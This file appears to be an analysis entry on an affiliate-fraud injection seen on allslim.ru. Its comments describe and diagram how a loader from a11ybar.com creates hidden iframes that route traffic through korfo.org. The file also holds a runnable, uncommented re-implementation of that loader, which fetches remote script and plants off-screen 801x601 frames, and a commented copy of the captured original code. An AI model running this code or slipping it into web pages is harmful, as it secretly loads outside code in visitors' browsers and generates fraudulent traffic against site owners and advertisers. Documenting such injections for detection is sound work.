/*
 * a11ybar / Korfo affiliate redirect injection
 *
 * Classification:
 *   tds
 *   compromise
 *   affiliatefraud
 *
 * Observed:
 *   allslim.ru
 *
 * The injected loader pulls a11ybar.com/stat.js. The returned JavaScript
 * creates off-screen browser frames for nethcdn.com and
 * powered-by-revidy.com.
 *
 * Public captures show both branches feeding into korfo.org, which routes
 * the generated traffic onward to affiliate destinations.
 *
 * The 801x601 frames are positioned 1000 pixels off the left side of the
 * page. They remain active browsing contexts, allowing redirects and
 * destination requests to execute outside the visible viewport.
 *
 * The same infrastructure appears across unrelated websites, including
 * WordPress and Shopify properties. Historical Shopify cases trace the
 * injection through retained third-party integration code.
 *
 * Page loads
 *     |
 *     +-> Inject external JavaScript
 *         |
 *         +-> a11ybar.com/stat.js
 *             |
 *             +-> Create off-screen iframe
 *             |   |
 *             |   +-> nethcdn.com/stat
 *             |       |
 *             |       +-> korfo.org
 *             |           |
 *             |           +-> affiliate destination
 *             |
 *             +-> Create off-screen iframe
 *                 |
 *                 +-> powered-by-revidy.com/a
 *                     |
 *                     +-> korfo.org/to2/<advertiser>/
 *                         |
 *                         +-> affiliate destination
 *
 * Observed infrastructure:
 *
 *   a11ybar.com
 *       JavaScript loader / traffic initiator
 *
 *   nethcdn.com
 *       Off-screen redirect ingress
 *
 *   powered-by-revidy.com
 *       Off-screen redirect ingress
 *
 *   korfo.org
 *       Redirect tracker / affiliate routing backend
 *
 *
 * ## Normalized
 */

(() => {
    "use strict";

    const LOADER_URL =
        "//a11ybar.com/stat.js";

    const FRAME_URLS = [
        "https://nethcdn.com/stat",
        "https://powered-by-revidy.com/a"
    ];

    /*
     * Load the external traffic-generation script.
     */
    function loadRedirectScript() {
        const script =
            document.createElement("script");

        script.type = "text/javascript";
        script.src = LOADER_URL;

        document.body.appendChild(script);
    }

    /*
     * Create an active browsing context outside the visible viewport.
     *
     * The original uses an 801x601 iframe positioned at left:-1000px.
     * Navigation inside the frame continues normally while the frame
     * remains outside the visible page.
     */
    function createOffscreenFrame(url) {
        const iframe =
            document.createElement("iframe");

        iframe.src = url;

        iframe.style.width = "801px";
        iframe.style.height = "601px";
        iframe.style.border = "0";
        iframe.style.position = "absolute";
        iframe.style.left = "-1000px";

        try {
            document.body.appendChild(iframe);
        } catch {
        }
    }

    /*
     * Match the empty capture-phase error listener used by the original.
     */
    document.addEventListener(
        "error",
        () => {},
        true
    );

    loadRedirectScript();

    for (const url of FRAME_URLS) {
        createOffscreenFrame(url);
    }
})();


/*
 * Original
 *
 * Loader observed on allslim.ru:
 *
 * var js = document.createElement("script");
 * js.type = "text/javascript";
 * js.src = "//a11ybar.com/stat.js";
 * document.body.appendChild(js);
 *
 *
 * Follow-on frame injection:
 *
 * document.addEventListener('error', function(e){}, true);
 * ifrm = document.createElement('iframe');
 * ifrm.setAttribute('src', 'https://nethcdn.com/stat');
 * ifrm.style.width = 801+'px';
 * ifrm.style.height = 601+'px';
 * ifrm.style.border = 0;
 * ifrm.style.position = 'absolute';
 * ifrm.style.left = '-1000px';
 * try {
 *     document.body.appendChild(ifrm);
 * } catch(e) {
 * }
 *
 *
 * document.addEventListener('error', function(e){}, true);
 * ifrm = document.createElement('iframe');
 * ifrm.setAttribute('src', 'https://powered-by-revidy.com/a');
 * ifrm.style.width = 801+'px';
 * ifrm.style.height = 601+'px';
 * ifrm.style.border = 0;
 * ifrm.style.position = 'absolute';
 * ifrm.style.left = '-1000px';
 * try {
 *     document.body.appendChild(ifrm);
 * } catch(e) {
 * }
 */
